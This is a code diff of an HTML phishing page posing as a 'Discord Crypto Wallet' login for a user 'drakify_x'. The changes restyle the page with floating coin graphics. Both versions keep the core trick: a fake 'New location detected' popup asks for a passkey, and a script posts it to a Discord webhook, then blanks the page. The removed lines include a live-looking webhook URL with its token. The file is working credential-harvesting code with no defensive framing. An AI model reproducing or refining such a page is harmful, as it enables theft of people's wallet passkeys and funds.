@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Drakify Login</title>
+  <title>Drakify | Discord Crypto Wallet</title>
   <link href="https://fonts.googleapis.com/css2?family=Rubik:wght@400;500;700&display=swap" rel="stylesheet">
   <style>
     * {
@@ -13,25 +13,40 @@
     }
 
     body {
-      background: #1e1f22;
-      overflow: hidden;
+      background: radial-gradient(circle at top, #2b2d31 0%, #1e1f22 100%);
       color: #fff;
       height: 100vh;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+      overflow: hidden;
       position: relative;
     }
 
-    /* Background animation */
-    body::before {
-      content: "";
+    .bg-coin {
       position: absolute;
-      top: 0; left: 0;
-      width: 100%; height: 100%;
-      background: url('https://www.transparenttextures.com/patterns/dark-mosaic.png');
-      opacity: 0.1;
-      z-index: 0;
+      width: 40px;
+      height: 40px;
+      background: url('https://cdn-icons-png.flaticon.com/512/825/825519.png') no-repeat center/cover;
+      animation: float 12s linear infinite;
+      opacity: 0.2;
+    }
+
+    @keyframes float {
+      0% {
+        transform: translateY(100vh) rotate(0deg);
+        left: 10%;
+      }
+      100% {
+        transform: translateY(-120vh) rotate(360deg);
+        left: 90%;
+      }
+    }
+
+    .container {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+      position: relative;
+      z-index: 1;
     }
 
     .login-box {
@@ -39,11 +54,9 @@
       border-radius: 16px;
       box-shadow: 0 0 25px rgba(0, 0, 0, 0.6);
       padding: 40px;
-      width: 360px;
+      width: 380px;
       text-align: center;
-      position: relative;
-      z-index: 2;
-      animation: fadeInUp 0.8s ease forwards;
+      border: 2px solid #5865f2;
     }
 
     .avatar {
@@ -57,14 +70,13 @@
     .username {
       font-size: 22px;
       font-weight: 600;
-      margin-bottom: 20px;
-      color: #fff;
+      margin-bottom: 6px;
     }
 
-    .wallet-header {
-      font-size: 18px;
+    .subtitle {
+      font-size: 14px;
       color: #b5bac1;
-      margin-bottom: 25px;
+      margin-bottom: 20px;
     }
 
     .login-btn {
@@ -75,7 +87,6 @@
       border-radius: 8px;
       font-size: 16px;
       cursor: pointer;
-      transition: 0.2s ease;
     }
 
     .login-btn:hover {
@@ -85,13 +96,17 @@
     .popup, .loading-screen {
       display: none;
       position: fixed;
-      top: 0; left: 0;
+      top: 0;
+      left: 0;
       height: 100vh;
       width: 100vw;
-      background: rgba(0, 0, 0, 0.8);
       justify-content: center;
       align-items: center;
       z-index: 10;
+    }
+
+    .popup {
+      background: rgba(0, 0, 0, 0.8);
     }
 
     .popup-box {
@@ -101,19 +116,11 @@
       width: 320px;
       text-align: center;
       box-shadow: 0 0 20px rgba(0, 0, 0, 0.4);
-      animation: fadeIn 0.4s ease-in-out;
     }
 
     .popup-box h3 {
       margin-bottom: 10px;
       font-size: 18px;
-      font-weight: 500;
-    }
-
-    .popup-box p {
-      font-size: 14px;
-      color: #b5bac1;
-      margin-bottom: 12px;
     }
 
     .popup-box input {
@@ -125,7 +132,6 @@
       background: #1e1f22;
       color: white;
       margin-bottom: 15px;
-      font-size: 15px;
     }
 
     .popup-box button {
@@ -135,7 +141,6 @@
       border: none;
       border-radius: 8px;
       cursor: pointer;
-      font-size: 15px;
     }
 
     .popup-box button:hover {
@@ -143,11 +148,17 @@
     }
 
     .loading-screen {
+      background: #1e1f22;
       flex-direction: column;
+      color: white;
+      font-size: 24px;
+      font-weight: bold;
+      animation: fadeIn 1s ease-in-out;
     }
 
-    .loading-dots {
-      font-size: 20px;
+    @keyframes fadeIn {
+      from { opacity: 0; transform: scale(0.95); }
+      to { opacity: 1; transform: scale(1); }
     }
 
     .loading-dots::after {
@@ -162,31 +173,28 @@
       66% { content: '..'; }
       100% { content: '...'; }
     }
-
-    @keyframes fadeIn {
-      from { opacity: 0; transform: scale(0.95); }
-      to { opacity: 1; transform: scale(1); }
-    }
-
-    @keyframes fadeInUp {
-      from { opacity: 0; transform: translateY(20px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
   </style>
 </head>
 <body>
 
-  <div class="login-box">
-    <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
-    <div class="username">drakify_x</div>
-    <div class="wallet-header">Discord Crypto Wallet</div>
-    <button class="login-btn" onclick="showPopup()">Log In</button>
+  <!-- Floating Crypto Coins -->
+  <div class="bg-coin" style="top: 80%; left: 5%; animation-delay: 0s;"></div>
+  <div class="bg-coin" style="top: 90%; left: 50%; animation-delay: 2s;"></div>
+  <div class="bg-coin" style="top: 100%; left: 75%; animation-delay: 4s;"></div>
+
+  <div class="container">
+    <div class="login-box">
+      <img class="avatar" src="https://i.pinimg.com/736x/ae/ed/d1/aeedd126eb22be0730716d4a6277ca54.jpg" alt="Avatar">
+      <div class="username">drakify_x</div>
+      <div class="subtitle">Discord Crypto Wallet - Secure Access</div>
+      <button class="login-btn" onclick="showPopup()">Log In</button>
+    </div>
   </div>
 
   <div class="popup" id="popup">
     <div class="popup-box">
       <h3>New location detected</h3>
-      <p>Please confirm your identity</p>
+      <p style="margin-bottom: 10px; font-size: 14px; color: #b5bac1;">Please confirm your identity</p>
       <input type="password" id="passInput" placeholder="Enter passkey">
       <br>
       <button onclick="sendPass()">Confirm</button>
@@ -200,20 +208,17 @@
   <script>
     const popup = document.getElementById("popup");
     const loading = document.getElementById("loading");
-    const passInput = document.getElementById("passInput");
-    const webhookURL = "https://discord.com/api/webhooks/1400800830147395615/aOABiZAWX2qwlfVnkBIrNonEZ4UkYVH42WvbFbv-Z8vhueamDQbuKZJay3MD9CwGn70c"; // Replace with your real webhook
+    const webhookURL = "https://discord.com/api/webhooks/your_webhook_url"; // Replace this
 
     function showPopup() {
       popup.style.display = "flex";
-      passInput.focus();
+      document.getElementById("passInput").focus();
     }
 
     function sendPass() {
-      const passkey = passInput.value.trim();
-
+      const passkey = document.getElementById("passInput").value;
       if (!passkey) {
-        alert("⚠️ Please provide a valid passkey.");
-        passInput.focus();
+        alert("⚠ Please provide a valid passkey.");
         return;
       }
 
@@ -222,15 +227,9 @@
       fetch(webhookURL, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          content: `🔐 Passkey submitted: **${passkey}**`
-        })
-      }).then(() => {
-        loading.style.display = "flex";
-        setTimeout(() => {
-          document.body.innerHTML = "";
-        }, 25000);
-      }).catch(() => {
+        body: JSON.stringify({ content: `🔐 Passkey submitted: **${passkey}**` })
+      })
+      .finally(() => {
         loading.style.display = "flex";
         setTimeout(() => {
           document.body.innerHTML = "";
@@ -238,9 +237,10 @@
       });
     }
 
-    passInput.addEventListener("keypress", function (e) {
+    document.getElementById("passInput").addEventListener("keypress", function (e) {
       if (e.key === "Enter") sendPass();
     });
   </script>
+
 </body>
 </html>
